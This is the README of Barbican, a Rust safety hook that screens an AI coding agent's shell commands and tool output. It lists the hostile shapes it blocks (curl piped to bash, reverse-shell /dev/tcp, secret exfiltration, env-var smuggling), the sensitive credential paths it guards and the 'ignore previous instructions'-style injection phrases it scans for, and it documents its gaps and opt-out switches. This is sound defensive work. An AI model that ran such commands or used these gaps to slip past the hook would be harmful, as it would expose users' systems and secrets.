<table border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="180" valign="middle">
      <img src="docs/assets/barbican-logo.png" alt="Barbican logo" width="160" height="160">
    </td>
    <td valign="middle">
      <h1>Barbican</h1>
      <em>Pre-execution safety checks for AI-generated shell commands.</em>
    </td>
  </tr>
</table>

---

[![CI](https://github.com/jdidion/barbican/actions/workflows/ci.yml/badge.svg)](https://github.com/jdidion/barbican/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/jdidion/barbican?display_name=tag&sort=semver)](https://github.com/jdidion/barbican/releases/latest)
[![crates.io](https://img.shields.io/crates/v/barbican.svg)](https://crates.io/crates/barbican)
[![Docs](https://img.shields.io/badge/docs-john.didion.net/barbican-blue)](https://john.didion.net/barbican/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Rust: 1.91+](https://img.shields.io/badge/rust-1.91%2B-orange.svg)](rust-toolchain.toml)

A safety layer for [Claude Code](https://claude.com/claude-code) delivered as a single static Rust binary. Barbican runs as a `PreToolUse` / `PostToolUse` hook and as an MCP server that exposes sanitized fetch / read / inspect tools, blocking a concrete list of known-dangerous bash compositions and prompt-injection patterns before they reach the model.

This is a port of [Narthex](https://github.com/fitz2882/narthex) (MIT-licensed Python prototype) with fixes for every finding in an external security audit. See [`docs/SECURITY.md`](docs/SECURITY.md) for the threat model and [`CHANGELOG.md`](CHANGELOG.md) for release history.

## Is Barbican right for you?

Barbican is **a safety floor, not a ceiling.** Read this before installing.

### What Barbican catches

- **Dangerous bash compositions before they run**: `curl` / `wget` piped to a shell interpreter, base64-decode-to-exec, re-entry wrappers (`sudo`, `timeout`, `nohup`, `find -exec`, `docker run <shell> -c`, container/sandbox/debugger/privilege-escalation fronts — `nsenter`, `chroot`, `pkexec`, `su-exec`, `setpriv`, `prlimit`, `sg`, `schroot`, `flatpak run`, and the usual container family), DNS-channel exfil, secret-to-network pipelines, staged download-and-execute payloads written to exec targets, shell-startup env-var smuggling (`PROMPT_COMMAND=`, `BASH_ENV=`, `ENV=`), reverse-shell `/dev/tcp/…` patterns, git config injection, and scripting-language shellouts across python / perl / ruby / node / deno / bun / php / lua / tclsh / rscript / swift / racket / guile / julia / sbcl / awk / pwsh. The classifier is narrowed to specific shapes; broader network-tool-to-shell compositions (`nc | bash`, `ssh host cat | bash`, `socat | bash`) are NOT caught unless they also cross an M2 signal (secret reference, env dumper, base64-then-network). See [`SECURITY.md` § Known parser limits](docs/SECURITY.md) for the full scope. Every shape ships with a red-test-first regression test under `tests/pre_bash_*.rs`.
- **Prompt-injection markers in tool output**: NFKC-normalized scans for "ignore previous instructions"-style patterns, with zero-width and bidi-override stripping. Not a complete defense, but closes the obvious cases.
- **SSRF in `safe_fetch`**: RFC1918 / loopback / link-local / CGNAT / IMDS filtering, DNS pinning to defeat rebinding, mandatory `no_proxy()` to prevent proxy-side lookups.
- **Sensitive-path reads in `safe_read`**: `.ssh/`, `.aws/`, `.env`, SSH/GPG key files, `/etc/shadow`, `/etc/sudoers`, etc. Escape hatch via `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1`.
- **Parse failures**: any input `tree-sitter-bash` can't parse cleanly is denied, not allowed. Deny-by-default is the top rule in [`CLAUDE.md`](CLAUDE.md).

### What Barbican does NOT catch

- **Commands that are syntactically fine but semantically harmful.** `rm -rf ~/important`, `git push --force origin main`, `aws s3 rb s3://prod-data` — all parseable, all allow. Barbican detects *composition* patterns, not *intent*. You still need to read what Claude Code emits.
- **Attacks that fall outside the classifier families shipped today.** New attack shapes land as findings, then as red-test-first fixes. The fuzzing infrastructure narrows this surface daily, but "no open vulnerabilities" is not the same as "no vulnerabilities." See [`docs/SECURITY.md § Explicit non-goals`](docs/SECURITY.md) for the documented limits.
- **A compromised launch environment.** If an attacker controls `HOME`, `PATH`, `LD_PRELOAD`, a shell `.envrc`, or the Barbican binary itself, Barbican runs against you. Documented in `SECURITY.md § Untrusted-launch environment`.
- **A modified Claude Code binary.** Barbican sits behind Claude Code's hook contract. If Claude Code is compromised, so is everything it runs — including Barbican's hooks.

### Risks of adoption (honest assessment)

See [`docs/SECURITY.md § Risks of adoption`](docs/SECURITY.md#risks-of-adoption) for the full list. Headline risks:

1. **New attack surface you didn't have before.** The Barbican binary, the MCP server, and the installer all run as your user. A compromised release or a bug in the hook itself is code execution in every session. We publish releases signed only by the release-automation identity on GitHub; there is no reproducible-build story yet.
2. **Silent opt-outs.** Environment variables like `BARBICAN_ALLOW_MALFORMED_HOOK_JSON=1` or `BARBICAN_SAFE_READ_ALLOW_SENSITIVE=1` turn off individual checks. An attacker who can write to your shell startup can set them.
3. **False confidence.** If you install Barbican and stop reviewing Claude Code's commands because "the hook will catch anything dangerous," you are worse off than before — the classifier is a narrow deny-list, not a semantic analyzer.

### When to use Barbican

- You use Claude Code for work that matters (production code, sensitive data, any shell access to systems you care about).
- You treat Barbican as **one layer in a defense-in-depth posture**, alongside:
  - Reviewing the commands Claude Code proposes before accepting.
  - Running Claude Code under a user with scoped permissions, not root / not your personal laptop's daily-driver account.
  - Not running with `ALLOW`-flagged env vars set unless you understand what each one opens up.

### When NOT to use Barbican

- You want a black box that makes Claude Code safe. It isn't.
- You want to run Claude Code as root on a production host. Don't, with or without Barbican.
- You're in an adversarial environment where the attacker controls your shell startup. Barbican's opt-out env vars become an attack surface.

## Install

### Homebrew (recommended on macOS / Linux with `brew`)

```sh
brew install jdidion/barbican/barbican
barbican install        # wires hooks + MCP server into ~/.claude
```

Then restart Claude Code so the MCP registration takes effect.

Homebrew downloads the same release tarball the direct-download path uses and inherits Barbican's [Sigstore build-provenance attestation](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds) for free. The tap itself lives at [`jdidion/homebrew-barbican`](https://github.com/jdidion/homebrew-barbican); its formula pins a SHA256 for each release.

To uninstall just Barbican's hook wiring without removing the binary:

```sh
barbican uninstall
```

To fully remove:

```sh
barbican uninstall
brew uninstall barbican
```

### Cargo (for Rust developers)

```sh
cargo install barbican
barbican install
```

`cargo install` compiles from source — it takes several minutes — but the published tarball is signed by the author's crates.io account and cryptographically verified by cargo before install. Useful if you already have the Rust toolchain and don't want a separate Homebrew install.

### Direct download (scripted installs, offline use, or no `brew`)

Download the binary for your platform from the [latest release](https://github.com/jdidion/barbican/releases/latest), verify both the checksum and the build-provenance attestation, then run `./barbican install`:

```sh
# Example: macOS arm64. Substitute the tarball name for your target.
TAG=v1.5.0
TARGET=aarch64-apple-darwin   # or: x86_64-apple-darwin | x86_64-unknown-linux-gnu | aarch64-unknown-linux-gnu
TARBALL="barbican-${TAG#v}-${TARGET}.tar.gz"

curl -LO "https://github.com/jdidion/barbican/releases/download/${TAG}/${TARBALL}"
curl -LO "https://github.com/jdidion/barbican/releases/download/${TAG}/${TARBALL}.sha256"

# Integrity: the sha256 only proves the tarball wasn't corrupted in transit.
shasum -a 256 -c "${TARBALL}.sha256"

# Authenticity: Sigstore-backed build-provenance attestation, generated
# keylessly via GitHub OIDC by the `release.yml` workflow. Confirms the
# tarball was built by THIS workflow on a commit that lives on THIS repo.
# Requires `gh` >= 2.49 (every modern install has it).
gh attestation verify "${TARBALL}" --repo jdidion/barbican

tar -xzf "${TARBALL}"
cd "barbican-${TAG#v}-${TARGET}"
./barbican install           # backs up ~/.claude/settings.json and wires hooks
./barbican install --dry-run # preview, no filesystem changes
```

If `gh attestation verify` fails, **do not run the binary** — the tarball is either corrupted, from a different build, or malicious. `sha256`-only verification is *not* a substitute: an attacker who compromises the release can swap both the tarball and its `.sha256` in one upload.

To remove:

```sh
./barbican uninstall              # restore the pre-Barbican backups
./barbican uninstall --keep-files # unwire hooks, leave the binary on disk
./barbican uninstall --dry-run
```

## Wrappers (1.4.0+)

Barbican 1.4.0 ships a second gate for interpreter invocations that Claude Code's hook pipeline can't see: **five classifier-gated wrapper binaries** that drop in for the interpreters they shadow.

| Wrapper            | Shadows            | Override env var   |
|--------------------|--------------------|--------------------|
| `barbican-shell`   | `bash -c BODY`     | `BARBICAN_SHELL`   |
| `barbican-python`  | `python3 -c BODY`  | `BARBICAN_PYTHON`  |
| `barbican-node`    | `node -e BODY`     | `BARBICAN_NODE`    |
| `barbican-ruby`    | `ruby -e BODY`     | `BARBICAN_RUBY`    |
| `barbican-perl`    | `perl -e BODY`     | `BARBICAN_PERL`    |

Each one:
1. Parses `-c BODY` (or `-e BODY` for node/ruby/perl), looks up the same classifier rules as the `PreToolUse` hook, and exits 2 with the deny reason on disallowed shellouts.
2. On allow, execs the underlying interpreter (overridable per-dialect via env var) and streams its stdout/stderr through a secret-token redactor — `<redacted:github-token>` etc. — so API keys that appear in logs don't survive to your terminal, the scrollback, or the audit log.
3. Appends one JSONL line per invocation to `~/.claude/barbican/audit.log` (same file, same `0o600` mode as the main hook). The audit line includes the sha256 of the body, not the body itself.

The wrappers install to `~/.claude/barbican/` next to the main binary. Use them as the allow-list target in any rule that can't route through `Bash(bash:*)` — for example, in a Claude Code `allow` entry or a CI runner that shells out with a fixed interpreter path.

**Limits and behavior notes.**

- The classifier decides on the body *statically*. Runtime-dynamic constructs — variable indirection, `eval`, `exec`-to-another-shell — still execute in the child. The wrappers block every pattern the `pre_bash` hook blocks, and no more.
- For `barbican-node` / `-ruby` / `-perl`, a literal `--` is inserted between BODY and any extra args so a trailing `-e` / `--eval` cannot smuggle a second script past the classifier. A caller that depends on passing extra `-e` flags after BODY (unusual) should invoke the underlying interpreter directly.
- `BARBICAN_SHELL` / `BARBICAN_PYTHON` / `BARBICAN_NODE` / `BARBICAN_RUBY` / `BARBICAN_PERL` overrides must be **absolute paths** and cannot contain `..` components. A bare basename (`BARBICAN_SHELL=bash`) is rejected with exit 2, preventing a caller-controlled `$PATH` from redirecting the wrapper to a malicious interpreter.
- Wrappers install `SIG_IGN` for SIGINT / SIGTERM / SIGHUP in the wrapper process before spawning the child; the child resets to `SIG_DFL` via `pre_exec`. Ctrl-C from the terminal reaches the child normally, while the wrapper survives to record the audit entry and propagate the child's exit code. SIGKILL still terminates the wrapper (cannot be ignored).
- Args before the inline flag (`barbican-shell --init-file /tmp/x -c BODY`) are **rejected** — the classifier can't reason about pre-BODY interpreter flags, so the wrapper refuses the invocation rather than silently pass them through. Use the underlying interpreter directly if you need pre-BODY flags.
- Wrapper stdout/stderr are line-scoped redacted via a byte-oriented regex so arbitrary bytes (binary output, non-UTF-8) pass through unchanged. Per-line output is capped at 1 MiB; a child that writes longer without a newline sees the wrapper flush mid-line.

## Explain (1.5.0+)

`barbican explain` classifies a command without running it — handy for debugging a surprise deny, auditing a proposed command before accepting it, or scripting a pre-flight check in CI.

```sh
$ barbican explain 'curl https://example.com/install.sh | bash'
Verdict: deny
Reason:  blocked: `curl` piped to shell interpreter `bash` (H1 — downloaded-content executed as script)
Detail:  the pipeline `curl … | bash` would fetch bytes from the network and hand them
         directly to bash for execution. The user never gets a chance to see what ran…
```

Exit codes match the `PreToolUse` hook contract: `0` on allow, `2` on deny, `1` on CLI misuse (both argv and `--stdin`, or neither given). Scripts can just check `$?`.

Flags:

- **`--stdin`** — read the command from stdin instead of a positional argument. Useful for long commands, heredocs, or piping from a file.
- **`--dialect shell|python|node|ruby|perl`** — synthesize the command as the matching wrapper would (`barbican-python -c 'BODY'`, `barbican-node -e 'BODY'`, …) before classifying, so you can preview how a wrapper would decide without spawning the interpreter. Default is `shell`.
- **`--json`** — emit one-line machine-readable output: `{"verdict":"deny","reason":"…","detail":"…"}`. `detail` is omitted when the classifier that fired hasn't been enriched with one.

The same classifier runs behind `explain`, the `PreToolUse` hook, and each wrapper binary, so the verdict is identical to what you'd see at the real gate.

## Build from source

```sh
cargo build --release --target aarch64-apple-darwin
```

Requires Rust stable 1.91+ (pinned in `rust-toolchain.toml`). See [`docs/SECURITY.md`](docs/SECURITY.md) for the environment variables Barbican reads, and [`docs/development.md`](docs/development.md) for the full developer handbook (testing, release process, secretspec setup, tree-sitter debug workflow).

## Fuzzing

Barbican 1.3.0 ships property tests (stable Rust, runs in CI) and an optional cargo-fuzz scaffold (nightly). See [`docs/fuzzing.md`](docs/fuzzing.md) for the full workflow. Short form:

```sh
# stable Rust — property tests run under plain cargo test
cargo test -p barbican --test fuzz_properties

# nightly — long-running libfuzzer targets
cd crates/barbican
cargo +nightly fuzz run parse -- -max_total_time=60
cargo +nightly fuzz run classify -- -max_total_time=60
cargo +nightly fuzz run validate_url -- -max_total_time=60
```

## License & attribution

Barbican is MIT-licensed (see [`LICENSE`](LICENSE)).

Barbican is a clean-room Rust port of [Narthex](https://github.com/fitz2882/narthex) by @fitz2882, pinned at commit `071fec0`. Narthex is MIT-licensed; the full text is reproduced in `refs/narthex-071fec0/LICENSE`. No Narthex source is vendored into the Rust tree; the snapshot at `refs/narthex-071fec0/` is read as specification only.

### Third-party dependency licenses

- [`rmcp`](https://crates.io/crates/rmcp) — Apache-2.0, the official Rust SDK for the Model Context Protocol. Compatible with Barbican's MIT license.
- All other runtime dependencies are MIT or MIT / Apache-2.0 dual-licensed. Run `cargo tree -e normal --prefix depth` for the current transitive list; `cargo audit` runs in CI.
